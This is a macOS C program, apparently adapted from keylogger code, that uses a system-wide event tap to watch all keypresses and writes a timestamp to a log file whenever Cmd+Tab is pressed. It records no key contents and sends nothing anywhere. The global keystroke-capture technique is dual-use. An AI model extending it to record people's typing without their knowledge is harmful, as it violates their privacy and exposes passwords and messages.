#include "keylogger.h"

CGEventFlags lastFlags = 0;

int main(int argc, const char *argv[]) {

    // Create an event tap to retrieve keypresses.
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL
    );

    // Exit the program if unable to create the event tap.
    if (!eventTap) {
        fprintf(stderr, "ERROR: Unable to create event tap.\n");
        exit(1);
    }

    // Create a run loop source and add enable the event tap.
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);


    // Clear the logfile if clear argument used or log to specific file if given.
    if (argc == 2) {
        if (strcmp(argv[1], "clear") == 0) {
            fopen(logfileLocation, "w");
            printf("%s cleared.\n", logfileLocation);
            fflush(stdout);
            exit(1);
        } else {
            logfileLocation = argv[1];
        }
    } else {
        printf("Usage: %s [logfile]\n", argv[0]);
        printf("       %s clear\n", argv[0]);
        fflush(stdout);
        exit(1);
    }

    // Get the current time and open the logfile.
    time_t result = time(NULL);
    logfile = fopen(logfileLocation, "a");

    if (!logfile) {
        fprintf(stderr, "ERROR: Unable to open log file. Ensure that you have the proper permissions.\n");
        exit(1);
    }

    // Output to logfile.
    // fprintf(logfile, "\n\nKeylogging has begun on %s\n", asctime(localtime(&result)));
    fflush(logfile);

    // Display the location of the logfile and start the loop.
    printf("Logging to: %s\n", logfileLocation);
    fflush(stdout);
    CFRunLoopRun();

    return 0;
}

// The following method returns the current time as an ISO 8601 formatted string (%Y-%m-%dT%H:%M:%S.%f).
const char *isotimestamp() {
    struct timeval now;
    gettimeofday(&now, NULL);

    static char timestamp[30];
    strftime(timestamp, 30, "%Y-%m-%dT%H:%M:%S", localtime(&now.tv_sec));
    char ms[8];
    sprintf(ms, ".%06ld", now.tv_usec);
    strcat(timestamp, ms);

    return timestamp;
}


// The following callback method is invoked on every keypress.
CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    // Retrieve the incoming keycode.
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    // Get the flags from the event.
    CGEventFlags flags = CGEventGetFlags(event);

    // Check if the keyCode is not 48 (which represents the [tab] key), or the flags do not contain kCGEventFlagMaskCommand (which represents the [cmd] key), if so return the event.
    if (keyCode != 48 || !(flags & kCGEventFlagMaskCommand)) {
        return event;
    }

    // If all checks pass, then the key combination [cmd] + [tab] has been pressed.
    // Print the human readable key to the logfile.
    fprintf(logfile, "%s\n", isotimestamp());
    fflush(logfile);
    return event;
}


